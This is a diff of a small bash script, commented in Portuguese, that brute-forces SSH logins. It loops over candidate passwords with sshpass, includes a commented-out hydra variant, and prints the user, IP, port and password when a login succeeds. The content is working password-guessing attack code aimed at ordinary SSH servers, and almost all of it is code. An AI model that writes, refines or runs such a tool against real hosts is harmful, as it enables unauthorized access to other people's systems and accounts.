@@ -3,8 +3,8 @@
 # Developed by Guizith
 
 #Este eh um script de brute force em ssh
-#Para uso eh necessario utilizar o pacote SSHPASS
-#~sudo apt-get install sshpass~
+#Para uso eh necessario utilizar o pacote HYDRA
+#~sudo apt-get install hydra~
 
 # Vetor
 VETORNUM=
@@ -94,14 +94,17 @@ do
     
     # Mostra a saida e tenta conexao com ssh
     echo '~Tentando conexão com a senha:' $TRY
-    exitsts=$(sshpass -p "$TRY" ssh $USRR@$IPADD -p $PORTT)
+   # esys=$(hydra -l $USRR -p $TRY $IPADD -t 4 ssh -s $PORTT)
+   esys=$(sshpass -p "$TRY" ssh $USRR@$IPADD -p $PORTT)
+   #CTRL-D
 
-echo 'chegou no if valor do exitsts'$exitsts
-
-#Saida do brute force caso obtenha acesso no sshpass
-   if [ exitsts = ":/ $" ]
+   if [ "${esys}" != "" ]
     then
-	  echo 'acabou'
+	  echo '-->Conexao aceita<--'
+	  echo 'User:' $USRR
+	  echo 'Ip Address:' $IPADD
+	  echo 'Port:' $PORTT
+	  echo 'Password:' $TRY
           exit
     fi
 
